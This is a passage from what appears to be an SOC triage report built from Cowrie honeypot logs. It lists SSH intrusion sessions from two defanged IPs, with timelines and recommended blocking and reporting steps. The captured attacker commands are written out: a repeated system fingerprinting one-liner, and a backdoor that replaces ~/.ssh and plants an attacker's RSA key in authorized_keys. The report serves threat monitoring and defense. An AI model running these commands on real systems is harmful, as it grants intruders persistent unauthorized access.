| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:27:01` | `cowrie.session.connect` |
| `2026-09-25 19:27:01` | `cowrie.client.version` |
| `2026-09-25 19:27:02` | `cowrie.client.kex` |
| `2026-09-25 19:27:02` | `cowrie.login.success` |
| `2026-09-25 19:27:04` | `cowrie.session.params` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.success` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.command.input` |
| `2026-09-25 19:27:04` | `cowrie.log.closed` |
| `2026-09-25 19:27:05` | `cowrie.session.params` |
| `2026-09-25 19:27:05` | `cowrie.command.input` |
| `2026-09-25 19:27:05` | `cowrie.log.closed` |
| `2026-09-25 19:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8422bf81ee2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:28 |
| **Last Seen** | 2026-09-25 19:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:28:56` | `cowrie.session.connect` |
| `2026-09-25 19:28:56` | `cowrie.client.version` |
| `2026-09-25 19:28:56` | `cowrie.client.kex` |
| `2026-09-25 19:28:57` | `cowrie.login.success` |
| `2026-09-25 19:28:59` | `cowrie.session.params` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.success` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.command.input` |
| `2026-09-25 19:28:59` | `cowrie.log.closed` |
| `2026-09-25 19:29:00` | `cowrie.session.params` |
| `2026-09-25 19:29:00` | `cowrie.command.input` |
| `2026-09-25 19:29:01` | `cowrie.log.closed` |
| `2026-09-25 19:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e901203abde

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:30 |
| **Last Seen** | 2026-09-25 19:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:30:45` | `cowrie.session.connect` |
| `2026-09-25 19:30:45` | `cowrie.client.version` |
| `2026-09-25 19:30:45` | `cowrie.client.kex` |
| `2026-09-25 19:30:46` | `cowrie.login.success` |
| `2026-09-25 19:30:47` | `cowrie.session.params` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.success` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:47` | `cowrie.command.input` |
| `2026-09-25 19:30:48` | `cowrie.log.closed` |
| `2026-09-25 19:30:49` | `cowrie.session.params` |
| `2026-09-25 19:30:49` | `cowrie.command.input` |
| `2026-09-25 19:30:49` | `cowrie.log.closed` |
| `2026-09-25 19:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f968d980bc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:32 |
| **Last Seen** | 2026-09-25 19:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:32:36` | `cowrie.session.connect` |
| `2026-09-25 19:32:36` | `cowrie.client.version` |
| `2026-09-25 19:32:36` | `cowrie.client.kex` |
| `2026-09-25 19:32:37` | `cowrie.login.success` |
| `2026-09-25 19:32:39` | `cowrie.session.params` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.success` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.command.input` |
| `2026-09-25 19:32:39` | `cowrie.log.closed` |
| `2026-09-25 19:32:40` | `cowrie.session.params` |
| `2026-09-25 19:32:40` | `cowrie.command.input` |
| `2026-09-25 19:32:41` | `cowrie.log.closed` |
| `2026-09-25 19:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aa73369c3b9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:34 |
| **Last Seen** | 2026-09-25 19:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:34:28` | `cowrie.session.connect` |
| `2026-09-25 19:34:28` | `cowrie.client.version` |
| `2026-09-25 19:34:28` | `cowrie.client.kex` |
| `2026-09-25 19:34:29` | `cowrie.login.success` |
| `2026-09-25 19:34:30` | `cowrie.session.params` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.success` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:30` | `cowrie.command.input` |
| `2026-09-25 19:34:31` | `cowrie.log.closed` |
| `2026-09-25 19:34:32` | `cowrie.session.params` |
| `2026-09-25 19:34:32` | `cowrie.command.input` |
| `2026-09-25 19:34:32` | `cowrie.log.closed` |
| `2026-09-25 19:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418e6a190e78

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:36 |
| **Last Seen** | 2026-09-25 19:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:36:26` | `cowrie.session.connect` |
| `2026-09-25 19:36:26` | `cowrie.client.version` |
| `2026-09-25 19:36:26` | `cowrie.client.kex` |
| `2026-09-25 19:36:27` | `cowrie.login.success` |
| `2026-09-25 19:36:28` | `cowrie.session.params` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.success` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:28` | `cowrie.command.input` |
| `2026-09-25 19:36:29` | `cowrie.log.closed` |
| `2026-09-25 19:36:30` | `cowrie.session.params` |
| `2026-09-25 19:36:30` | `cowrie.command.input` |
| `2026-09-25 19:36:30` | `cowrie.log.closed` |
| `2026-09-25 19:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7027f7c9efb8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:38 |
| **Last Seen** | 2026-09-25 19:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:38:28` | `cowrie.session.connect` |
| `2026-09-25 19:38:28` | `cowrie.client.version` |
| `2026-09-25 19:38:28` | `cowrie.client.kex` |
| `2026-09-25 19:38:29` | `cowrie.login.success` |
| `2026-09-25 19:38:30` | `cowrie.session.params` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.success` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.command.input` |
| `2026-09-25 19:38:30` | `cowrie.log.closed` |
| `2026-09-25 19:38:31` | `cowrie.session.params` |
| `2026-09-25 19:38:31` | `cowrie.command.input` |
| `2026-09-25 19:38:32` | `cowrie.log.closed` |
| `2026-09-25 19:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07e4fedeab20

| Field | Detail |
|---|---|
| **Source IP** | `121.227.152[.]171` |
| **First Seen** | 2026-09-25 19:40 |
| **Last Seen** | 2026-09-25 19:45 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:40:09` | `cowrie.session.connect` |
| `2026-09-25 19:40:09` | `cowrie.client.version` |
| `2026-09-25 19:40:09` | `cowrie.client.kex` |
| `2026-09-25 19:40:10` | `cowrie.login.success` |
| `2026-09-25 19:40:11` | `cowrie.session.params` |
| `2026-09-25 19:40:11` | `cowrie.command.input` |
| `2026-09-25 19:40:11` | `cowrie.command.failed` |
| `2026-09-25 19:40:12` | `cowrie.log.closed` |
| `2026-09-25 19:40:12` | `cowrie.session.params` |
| `2026-09-25 19:40:12` | `cowrie.command.input` |
| `2026-09-25 19:40:13` | `cowrie.session.file_download` |
| `2026-09-25 19:40:13` | `cowrie.log.closed` |
| `2026-09-25 19:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.227.152[.]171` to AbuseIPDB if not already reported
- [ ] Block `121.227.152[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88b86f9957e7

| Field | Detail |
|---|---|
| **Source IP** | `121.227.152[.]171` |
| **First Seen** | 2026-09-25 19:40 |
| **Last Seen** | 2026-09-25 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:40:13` | `cowrie.session.connect` |
| `2026-09-25 19:40:13` | `cowrie.client.version` |
| `2026-09-25 19:40:13` | `cowrie.client.kex` |
| `2026-09-25 19:40:14` | `cowrie.login.success` |
| `2026-09-25 19:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.227.152[.]171` to AbuseIPDB if not already reported
- [ ] Block `121.227.152[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea8ee61996c

| Field | Detail |
|---|---|
| **Source IP** | `121.227.152[.]171` |
| **First Seen** | 2026-09-25 19:40 |
| **Last Seen** | 2026-09-25 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:40:14` | `cowrie.session.connect` |
| `2026-09-25 19:40:14` | `cowrie.client.version` |
| `2026-09-25 19:40:15` | `cowrie.client.kex` |
| `2026-09-25 19:40:16` | `cowrie.login.success` |
| `2026-09-25 19:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.227.152[.]171` to AbuseIPDB if not already reported
- [ ] Block `121.227.152[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26517e6c4e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:40 |
| **Last Seen** | 2026-09-25 19:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:40:30` | `cowrie.session.connect` |
| `2026-09-25 19:40:30` | `cowrie.client.version` |
| `2026-09-25 19:40:30` | `cowrie.client.kex` |
| `2026-09-25 19:40:31` | `cowrie.login.success` |
| `2026-09-25 19:40:32` | `cowrie.session.params` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.success` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:32` | `cowrie.command.input` |
| `2026-09-25 19:40:33` | `cowrie.log.closed` |
| `2026-09-25 19:40:34` | `cowrie.session.params` |
| `2026-09-25 19:40:34` | `cowrie.command.input` |
| `2026-09-25 19:40:34` | `cowrie.log.closed` |
| `2026-09-25 19:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-151d9d335408

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:42 |
| **Last Seen** | 2026-09-25 19:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:42:33` | `cowrie.session.connect` |
| `2026-09-25 19:42:33` | `cowrie.client.version` |
| `2026-09-25 19:42:33` | `cowrie.client.kex` |
| `2026-09-25 19:42:35` | `cowrie.login.success` |
| `2026-09-25 19:42:36` | `cowrie.session.params` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.success` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.command.input` |
| `2026-09-25 19:42:36` | `cowrie.log.closed` |
| `2026-09-25 19:42:37` | `cowrie.session.params` |
| `2026-09-25 19:42:37` | `cowrie.command.input` |
| `2026-09-25 19:42:37` | `cowrie.log.closed` |
| `2026-09-25 19:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9faebedc8c2e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:44 |
| **Last Seen** | 2026-09-25 19:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:44:36` | `cowrie.session.connect` |
| `2026-09-25 19:44:36` | `cowrie.client.version` |
| `2026-09-25 19:44:36` | `cowrie.client.kex` |
| `2026-09-25 19:44:38` | `cowrie.login.success` |
| `2026-09-25 19:44:39` | `cowrie.session.params` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.success` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:39` | `cowrie.command.input` |
| `2026-09-25 19:44:40` | `cowrie.log.closed` |
| `2026-09-25 19:44:42` | `cowrie.session.params` |
| `2026-09-25 19:44:42` | `cowrie.command.input` |
| `2026-09-25 19:44:42` | `cowrie.log.closed` |
| `2026-09-25 19:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-003cc9510c95

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:46 |
| **Last Seen** | 2026-09-25 19:46 |
| **Session Duration** | 6s |
